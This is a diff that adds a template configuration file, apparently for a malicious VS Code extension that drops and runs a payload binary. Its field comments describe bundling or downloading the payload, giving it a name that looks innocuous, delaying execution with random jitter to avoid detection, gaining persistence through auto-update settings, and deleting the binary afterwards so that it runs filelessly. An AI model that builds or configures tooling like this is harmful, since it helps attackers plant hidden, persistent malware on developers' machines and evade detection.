@@ -1,0 +1,27 @@
+{
+  "_comment": "Copy this file to config.json and fill in your values. config.json is gitignored.",
+
+  "method": "embedded",
+  "_comment_method": "embedded = binary bundled in the .vsix | download = fetch at runtime via url",
+
+  "url": "",
+  "_comment_url": "If method=download, set this to the URL serving your payload binary",
+
+  "payloadName": "com.vscode.helper",
+  "_comment_payloadName": "Filename for the dropped payload (should look innocuous)",
+
+  "delayMs": 5000,
+  "_comment_delayMs": "Delay (ms) before payload execution after extension activation",
+
+  "jitterMs": 3000,
+  "_comment_jitterMs": "Random jitter (ms) added to delayMs to avoid deterministic patterns",
+
+  "persist": true,
+  "_comment_persist": "Enable VS Code auto-update settings for soft persistence",
+
+  "cleanup": true,
+  "_comment_cleanup": "Delete the dropped binary after execution (fileless after launch)",
+
+  "cleanupDelayMs": 30000,
+  "_comment_cleanupDelayMs": "Delay (ms) before cleanup — must be long enough for payload to start"
+}
